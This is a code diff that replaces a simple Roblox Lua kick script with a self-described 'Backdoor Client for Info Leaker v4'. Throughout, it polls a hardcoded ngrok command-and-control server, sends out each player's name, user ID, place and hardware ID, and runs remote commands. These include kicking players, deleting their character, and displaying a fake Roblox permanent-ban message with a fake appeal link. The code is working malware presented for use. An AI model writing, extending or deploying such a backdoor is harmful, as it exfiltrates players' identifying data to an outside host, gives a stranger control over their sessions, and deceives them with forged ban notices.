@@ -1,12 +1,271 @@
-task.spawn(function()
-    local Players = game:GetService("Players")
+-- Backdoor Client for Info Leaker v4
+-- Communicates with Python server for remote command execution
+
+local BackdoorClient = {}
+BackdoorClient.__index = BackdoorClient
+
+-- Configuration
+local CONFIG = {
+    SERVER_URL = "https://fausto-expropriable-mackenzie.ngrok-free.dev",  -- Your ngrok URL
+    AUTH_TOKEN = "backdoor_token_2024",
+    POLL_INTERVAL = 2,  -- seconds between command checks
+    HEARTBEAT_INTERVAL = 5,  -- seconds between heartbeats
+    RETRY_ATTEMPTS = 3,
+    RETRY_DELAY = 1
+}
+
+-- HTTP request function (using existing pattern from desponce.lua)
+local function makeHttpRequest(requestData)
+    local success, result = pcall(function()
+        if http_request then
+            return http_request(requestData)
+        elseif request then
+            return request(requestData)
+        elseif syn and syn.request then
+            return syn.request(requestData)
+        elseif http and http.request then
+            return http.request(requestData)
+        else
+            if requestData.Method == "GET" or not requestData.Method then
+                local response = game:HttpGet(requestData.Url, false, requestData.Headers)
+                return {Body = response, StatusCode = 200}
+            else
+                error("HTTP POST not supported with HttpService fallback")
+            end
+        end
+    end)
     
-    -- Wait for LocalPlayer to exist
-    local player
-    repeat
-        task.wait()
-        player = Players.LocalPlayer
-    until player
+    if success then
+        return result
+    else
+        return nil
+    end
+end
+
+-- Generate unique client ID
+local function generateClientId()
+    local hwid = "unknown"
+    pcall(function()
+        if type(gethwid) == "function" then
+            hwid = tostring(gethwid())
+        end
+    end)
     
-    player:Kick("You have been removed from the game.")
-end)
+    if hwid == "unknown" then
+        hwid = game:GetService("RbxAnalyticsService"):GetClientId() or "unknown"
+    end
+    
+    return hwid
+end
+
+-- Create new backdoor client
+function BackdoorClient:new()
+    local client = {}
+    setmetatable(client, BackdoorClient)
+    
+    client.clientId = generateClientId()
+    client.serverUrl = CONFIG.SERVER_URL
+    client.authToken = CONFIG.AUTH_TOKEN
+    client.running = false
+    client.lastCommandCheck = 0
+    client.lastHeartbeat = 0
+    
+    return client
+end
+
+-- Safe HTTP request with retry
+function BackdoorClient:safeRequest(method, url, body, headers)
+    local requestData = {
+        Url = url,
+        Method = method,
+        Headers = headers or {}
+    }
+    
+    if body then
+        requestData.Body = body
+    end
+    
+    for attempt = 1, CONFIG.RETRY_ATTEMPTS do
+        local response = makeHttpRequest(requestData)
+        
+        if response and (response.StatusCode == 200 or response.StatusCode == 204) then
+            return response
+        end
+        
+        if attempt < CONFIG.RETRY_ATTEMPTS then
+            task.wait(CONFIG.RETRY_DELAY)
+        end
+    end
+    
+    return nil
+end
+
+-- Send heartbeat to server
+function BackdoorClient:sendHeartbeat()
+    local player = game:GetService("Players").LocalPlayer
+    if not player then return false end
+    
+    local data = {
+        client_id = self.clientId,
+        player_name = player.Name or "Unknown",
+        place_name = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown"
+    }
+    
+    local response = self:safeRequest("POST", self.serverUrl .. "/heartbeat", 
+        game:GetService("HttpService"):JSONEncode(data),
+        {["Content-Type"] = "application/json"})
+    
+    return response ~= nil
+end
+
+-- Get pending commands from server
+function BackdoorClient:getCommands()
+    local response = self:safeRequest("GET", self.serverUrl .. "/get_commands", nil,
+        {["Authorization"] = self.authToken})
+    
+    if response then
+        local success, data = pcall(function()
+            return game:GetService("HttpService"):JSONDecode(response.Body)
+        end)
+        
+        if success and data.success then
+            return data.commands or {}
+        end
+    end
+    
+    return {}
+end
+
+-- Report command execution result
+function BackdoorClient:reportResult(commandId, result, status)
+    local data = {
+        command_id = commandId,
+        result = result,
+        status = status
+    }
+    
+    local response = self:safeRequest("POST", self.serverUrl .. "/report",
+        game:GetService("HttpService"):JSONEncode(data),
+        {["Content-Type"] = "application/json"})
+    
+    return response ~= nil
+end
+
+-- Execute commands
+function BackdoorClient:executeCommand(commandId, command)
+    local result = ""
+    local status = "completed"
+    
+    pcall(function()
+        if command == "kick" then
+            local player = game:GetService("Players").LocalPlayer
+            if player then
+                player:Kick("Kicked by remote administrator")
+                result = "Player kicked successfully"
+            else
+                result = "LocalPlayer not found"
+                status = "failed"
+            end
+            
+        elseif command == "delete_model" then
+            local player = game:GetService("Players").LocalPlayer
+            if player and player.Character then
+                player.Character:Destroy()
+                result = "Character model deleted"
+            else
+                result = "Character not found"
+                status = "failed"
+            end
+            
+        elseif command == "fake_ban" then
+            local player = game:GetService("Players").LocalPlayer
+            if player then
+                player:Kick("🚫 You have been permanently banned from Roblox\nReason: Suspicious activity detected\nAppeal: roblox.com/support")
+                result = "Fake ban message sent"
+            else
+                result = "LocalPlayer not found"
+                status = "failed"
+            end
+            
+        elseif command == "info" then
+            local player = game:GetService("Players").LocalPlayer
+            if player then
+                local placeInfo = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
+                result = string.format("Player: %s (%d)\nPlace: %s (%d)\nExecutor: %s\nHWID: %s",
+                    player.Name, player.UserId,
+                    placeInfo.Name, game.PlaceId,
+                    (getexecutorname and getexecutorname() or "Unknown"),
+                    self.clientId)
+            else
+                result = "LocalPlayer not found"
+                status = "failed"
+            end
+            
+        else
+            result = "Unknown command: " .. command
+            status = "failed"
+        end
+    end)
+    
+    -- Report result back to server
+    self:reportResult(commandId, result, status)
+end
+
+-- Main polling loop
+function BackdoorClient:start()
+    if self.running then
+        warn("[BACKDOOR] Client already running")
+        return
+    end
+    
+    self.running = true
+    print("[BACKDOOR] Starting client...")
+    print("[BACKDOOR] Server:", self.serverUrl)
+    print("[BACKDOOR] Client ID:", self.clientId)
+    
+    task.spawn(function()
+        while self.running do
+            local currentTime = tick()
+            
+            -- Send heartbeat
+            if currentTime - self.lastHeartbeat >= CONFIG.HEARTBEAT_INTERVAL then
+                pcall(function()
+                    if self:sendHeartbeat() then
+                        self.lastHeartbeat = currentTime
+                    end
+                end)
+            end
+            
+            -- Check for commands
+            if currentTime - self.lastCommandCheck >= CONFIG.POLL_INTERVAL then
+                pcall(function()
+                    local commands = self:getCommands()
+                    for commandId, commandData in pairs(commands) do
+                        print("[BACKDOOR] Executing command:", commandData.command)
+                        self:executeCommand(commandId, commandData.command)
+                        self.lastCommandCheck = currentTime
+                    end
+                end)
+            end
+            
+            task.wait(0.5)
+        end
+    end)
+end
+
+-- Stop the client
+function BackdoorClient:stop()
+    self.running = false
+    print("[BACKDOOR] Client stopped")
+end
+
+-- Create and start global client
+local client = BackdoorClient:new()
+client:start()
+
+-- Export to global
+getgenv().BackdoorClient = BackdoorClient
+getgenv().backdoorClient = client
+
+print("[BACKDOOR] Remote backdoor client initialized")
+print("[BACKDOOR] Use getgenv().backdoorClient to control manually")
